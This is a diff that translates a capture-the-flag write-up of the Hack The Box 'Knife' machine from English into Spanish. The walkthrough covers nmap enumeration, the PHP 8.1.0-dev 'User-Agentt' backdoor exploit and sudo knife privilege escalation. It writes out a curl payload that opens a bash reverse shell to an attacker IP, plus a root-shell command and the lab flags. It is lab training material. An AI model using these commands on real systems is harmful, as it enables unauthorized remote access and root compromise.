@@ -1,46 +1,46 @@
-# Knife (Easy · Linux)
+# Knife (Easy Linux)
 
 **Author:** Ph4n3s
-**Date:** 2026-10-19
+**Fecha:** 19/10/2026
 **IP:** 10.129.78.40
-**Difficulty:** Easy / Linux
+**Dificultad:** Easy / Linux
 
 ---
 
-## 1. Enumeration
+## 1. Enumeración
 
 ### 1.1 Ping
 
-First we run a `ping -c 10.129.78.40`, which returns the following:
+Primero vamos a realizar un `ping -c 10.129.78.40` en el que como respuesta vamos a tener lo siguiente:
 
 ```
 64 bytes from 10.129.78.40: icmp_seq=1 ttl=63 time=53.9 ms
 ```
 
-From the TTL we know it is a Linux machine.
+Por el ttl sabemos que es una máquina Linux.
 
-### 1.2 Port and service enumeration
+### 1.2 Enumeración de puertos y servicios
 
-We will use the following nmap to find the open ports:
+Utilizaremos el siguiente nmap para buscar los puertos abiertos:
 
 ```
 nmap -p- -open -T4 --min-rate 5000 10.129.78.40 -oN ~/HTB_machines/Knife/ports
 ```
 
-The response we got was:
+Como respuesta obtuvimos lo siguiente:
 
 ```
 22/tcp open  ssh
 80/tcp open  http
 ```
 
-Both SSH and HTTP, so with the next command we dig deeper into the services running on those ports:
+Tanto el ssh como un http, así que con el siguiente comando profundizaremos más acerca de los servicios corriendo en esos puertos para profundizar en sí la información que tenemos:
 
 ```
 nmap -p 80,22 -sVC -T4 --min-rate 5000 10.129.78.40 -oN ~/HTB_machines/Knife/targeted
 ```
 
-The response was:
+La respuesta fue la siguiente:
 
 ```
 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
@@ -54,9 +54,9 @@ The response was:
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-We notice two things: first, on port 80 we have an Apache 2.4.41 service, a system that is vulnerable and has been outdated since 2019. As for OpenSSH, it is an old Ubuntu server version, unpatched since 2021, but not vulnerable per se, so we will focus on the HTTP.
+Nos percatamos de dos factores: el primero es que en el puerto 80 tenemos un servicio Apache 2.4.41, un sistema que es vulnerable y lleva desactualizado desde 2019. Si hablamos del OpenSSH tenemos un Ubuntu antiguo servidor, lleva sin actualizarse desde 2021, pero no es vulnerable en sí, entonces nos centraremos en el http.
 
-Now with the following scan we look for actually interesting vulnerabilities on those ports with those specific versions, running:
+Ahora con el siguiente escaneo buscaremos vulnerabilidades ya interesantes en esos puertos con esas versiones en concreto, ejecutando el siguiente nmap:
 
 ```
 nmap -p 80,22 --script vuln -T4 --min-rate 5000 10.129.78.40 -oN ~/HTB_machines/Knife/vulns
@@ -76,11 +76,11 @@ PORT   STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 32.85 seconds
 ```
 
-We can see a few things: first, nothing at all on the SSH port, but there is a folder on the web, `/icons/`, of potential interest, so let's take a look and, if not, use a fuzzing tool to enumerate subdomains. At first it looks like the page of a medical center.
+Podemos observar varias cosas: primero en el puerto ssh nada de nada, pero hay una carpeta en la web que es la `/icons/`, de potencial interés, así que vamos a echarle un vistazo y si no, utilizar una herramienta de fuzzing para enumerar subdominios. Al principio parece ser una página de un centro médico.
 
-![Web page - Emergent Medical Idea](01-pagina-web.png)
+![Página web - Emergent Medical Idea](01-pagina-web.png)
 
-Before fuzzing, let's enumerate the web's header with a curl:
+Antes de hacer fuzz, vamos a enumerar con un curl la cabecera de la web:
 
 ```
 HTTP/1.1 200 OK
@@ -90,29 +90,29 @@ X-Powered-By: PHP/8.1.0-dev
 Content-Type: text/html; charset=UTF-8
 ```
 
-The most important thing is this: `X-Powered-By: PHP/8.1.0-dev`, meaning it is written in PHP.
+Lo más importante es esto: `X-Powered-By: PHP/8.1.0-dev`, o sea, está escrita en PHP.
 
-That version has a vulnerability that is a backdoor. It is not a PHP injection per se, but a ready-made backdoor that already has exploits written for it, for example this one: *PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution* (`php/webapps/49933.py`).
+La versión tiene una vulnerabilidad que es un backdoor. No es en sí una inyección en PHP, sino que es un backdoor ya hecho que tiene exploits ya creados, por ejemplo este: *PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution* (`php/webapps/49933.py`).
 
 ![Exploit-DB: PHP 8.1.0-dev User-Agentt RCE](02-exploit-db.png)
 
 ---
 
-## 2. Exploitation
+## 2. Explotación
 
-For the exploitation itself we run the script already preinstalled on Kali Linux `49933.py` ([github.com/flast101/php-8.1.0-dev-backdoor-rce](https://github.com/flast101/php-8.1.0-dev-backdoor-rce)):
+Para la explotación en sí vamos a ejecutar el script ya preinstalado en Kali Linux `49933.py` ([github.com/flast101/php-8.1.0-dev-backdoor-rce](https://github.com/flast101/php-8.1.0-dev-backdoor-rce)):
 
 ```
 sudo python3 /usr/share/exploitdb/exploits/php/webapps/49933.py
 ```
 
-It asks me for the web URL, which would be `http://10.129.78.40:80/`, and it opens the reverse shell directly.
+Me pide la url de la web, que sería `http://10.129.78.40:80/`, y me abre directamente la reverse.
 
-![Shell obtained after running the exploit](03-shell-james.png)
+![Shell obtenida tras ejecutar el exploit](03-shell-james.png)
 
-### 2.1 Privilege escalation and post-exploitation
+### 2.1 Escalada de privilegios y post explotación
 
-Already on the machine, if we want to access the `/home` directory for the flag or root, we can't, but the way to escalate privileges would be to see exactly what we can run as superuser. In this case we use `sudo -l` to check:
+Ya en la máquina, si queremos acceder al directorio `/home` para tener la flag o al root, no podemos, pero la manera de escalar privilegios sería ver qué exactamente podemos ejecutar como superusuario. En este caso utilizaremos `sudo -l` para verlo:
 
 ```
 Matching Defaults entries for james on knife:
@@ -122,67 +122,67 @@ User james may run the following commands on knife:
     (root) NOPASSWD: /usr/bin/knife
 ```
 
-Knife is a documented tool that gives us, with a single command, direct access to a shell as root. The command would be the following:
+Knife es una herramienta documentada que nos da directamente, con un comando, acceso a la shell como root. El comando sería el siguiente:
 
 ```
 sudo knife exec -E "exec \"/bin/sh\""
 ```
 
-![Privilege escalation with knife and root access](04-privesc-knife.png)
+![Escalada de privilegios con knife y acceso root](04-privesc-knife.png)
 
-After that we navigate to `/home/james` and `cat` `user.txt`, getting the following output: `0b5d83ce1592f91e60061603b260b1f8`. Then to `/root` and `cat` `root.txt`, which gives the flag: `c886b9a3411dc5c171acf5f86d12e2bb`.
+Tras ello navegamos a `/home/james` y hacemos `cat` a `user.txt`, obteniendo el siguiente output: `0b5d83ce1592f91e60061603b260b1f8`. Y luego a `/root` y hago `cat` a `root.txt`, que me da la flag: `c886b9a3411dc5c171acf5f86d12e2bb`.
 
-![Root shell browsing the filesystem](05-root-shell.png)
+![Shell como root navegando el filesystem](05-root-shell.png)
 
 ---
 
-## Important and additional learning notes
+## Notas importantes y adicionales de aprendizaje
 
-*(This is where the machine ends; this is in case you're curious and want to learn a bit more.)*
+*(Aquí ya se acaba la máquina, es por si eres curios@ y quieres aprender un poco más)*
 
-Even though I used an escalation with an exploit, there is another simple way to do this process; the exploit itself is fine, as it is a way to automate the exploitation, but there is a way to improve it and do the reverse shell manually.
+A pesar de que he utilizado una escalada con un exploit, hay otra sencilla manera de realizar este proceso; el exploit en sí está bien, ya que es una manera de realizar una automatización de la explotación, pero hay una manera de mejorar y hacer la reverse de forma manual.
 
-If we study the vulnerability in depth, through a specific phrase when writing a request with curl, we can make the server execute our text as code, and that way inject a manual reverse shell. In fact, we are not injecting anything; it should be clear that a reverse shell is redirecting the input and output of a victim machine to a port on ours where we are listening with netcat.
+Si estudiamos a fondo la vulnerabilidad, mediante una específica frase a la hora de redactar una petición con curl, podemos hacer que el servidor ejecute nuestro texto como código, y de esa manera inyectar una reverse shell manual. En sí, no estamos inyectando nada; debe quedar claro que la reverse es redirigir las entradas y salidas de una máquina víctima con un puerto de la nuestra en el que estamos escuchando con netcat.
 
-The way to inject a manual shell would be with the following command:
+La manera de inyectar una shell manual sería con el siguiente comando:
 
 ```
 curl -s http://10.129.78.40/ -H 'User-Agentt: zerodiumsystem("bash -c '"'"'bash -i >& /dev/tcp/10.10.16.120/4444 0>&1'"'"'");'
 ```
 
-Why like this? And why would we investigate how to do it the following way? Mainly because of an exploit failure — the goal is to `cat` the exploit and read how it works. If we read it, we see it simply makes a header request to the web with certain parameters that, if we edit, we can trigger ourselves:
+¿Por qué así? y ¿Por qué investigaríamos cómo hacerlo de la siguiente manera? Principalmente por el error de un exploit, el objetivo es hacer un `cat` al exploit y leer cómo funciona. Si lo leemos, vemos que simplemente hace un header a la web con ciertos parámetros que, si editamos, podemos abrir por nosotros mismos:
 
 ```php
 if (str_starts_with($useragent, "zerodium")) {
-    system(substr($useragent, 8)); // runs the rest
+    system(substr($useragent, 8)); // ejecuta el resto
 }
 ```
 
-The command we launch: with `-s` we tell it not to show loading bars, we specify the machine's IP, and with `-H` it builds a special header that activates the bash backdoor:
+El comando que lanzamos: con `-s` decimos que no haga barras de carga, indicamos la ip de la máquina, y con el `-H` hace un header especial que activa el backdoor bash:
 
 ```
 bash -c 'bash -i >& /dev/tcp/10.10.16.120/4444 0>&1'
 ```
 
-That is what actually runs, opening an interactive console (`bash -i`) and redirecting the input/output stream (`0>&1`) to our machine (`10.10.16.120`).
+Es lo que ejecuta realmente, de manera que abre una consola interactiva (`bash -i`) y redirige el flujo de entrada y salida (`0>&1`) a nuestra máquina (`10.10.16.120`).
 
-On the website [pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) we can find how to open different shells in different languages, useful in this exercise for the PHP case.
+En la web [pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) podemos encontrar cómo abrir diferentes shells en diferentes lenguajes, útil en este ejercicio para el caso de PHP.
 
-Then we would listen with `nc -lnvp 4444` on port 4444 (listen, numeric, verbose and port) so that the stream goes over that channel.
+Luego escucharíamos con un `nc -lnvp 4444` en el puerto 4444 (listen, numeric, verbose y port) de manera que tenga el flujo en ese canal.
 
 ---
 
-## Quick summary
+## Resumen rápido
 
-**What the machine was:** an Apache web server with PHP 8.1.0-dev that had a backdoor maliciously introduced into PHP's official source code.
+**Qué era la máquina:** un servidor web Apache con PHP 8.1.0-dev que tenía un backdoor introducido maliciosamente en el código fuente oficial de PHP.
 
-**Enumeration:** `nmap` → ports 22 (SSH) and 80 (HTTP) → `curl -I` → you discover `X-Powered-By: PHP/8.1.0-dev` → that version = known backdoor.
+**Enumeración:** `nmap` → puertos 22 (SSH) y 80 (HTTP) → `curl -I` → descubres `X-Powered-By: PHP/8.1.0-dev` → esa versión = backdoor conocido.
 
-**Exploitation:** the backdoor reads the `User-Agentt` header and executes its content as PHP. That is abused to send a reverse shell: curl with malicious header → PHP runs bash → bash redirects its input/output to your `nc`. Your machine listens with `nc -lvnp 4444` and receives the connection → shell as `james`.
+**Explotación:** el backdoor lee el header `User-Agentt` y ejecuta su contenido como PHP. Se aprovecha eso para mandar una reverse shell: curl con header malicioso → PHP ejecuta bash → bash redirige su entrada/salida a tu `nc`. Tu máquina escucha con `nc -lvnp 4444` y recibe la conexión → shell como `james`.
 
-**Privilege escalation:** `sudo -l` → james can run `/usr/bin/knife` as root without a password → `sudo knife exec -E "exec \"/bin/sh\""` → shell as root.
+**Escalada de privilegios:** `sudo -l` → james puede ejecutar `/usr/bin/knife` como root sin contraseña → `sudo knife exec -E "exec \"/bin/sh\""` → shell como root.
 
-**Key concept learned:** a reverse shell is not code you program, it is redirecting bash's input/output channels over a TCP connection toward your machine. The same concept as Tomcat, but without needing to upload a file — the HTTP request was both the payload and the execution at once.
+**Concepto clave aprendido:** una reverse shell no es código que programas, es redirigir los canales de entrada/salida de bash por una conexión TCP hacia tu máquina. El mismo concepto que Tomcat, pero sin necesidad de subir archivo — la petición HTTP era el payload y la ejecución a la vez.
 
 ---
 
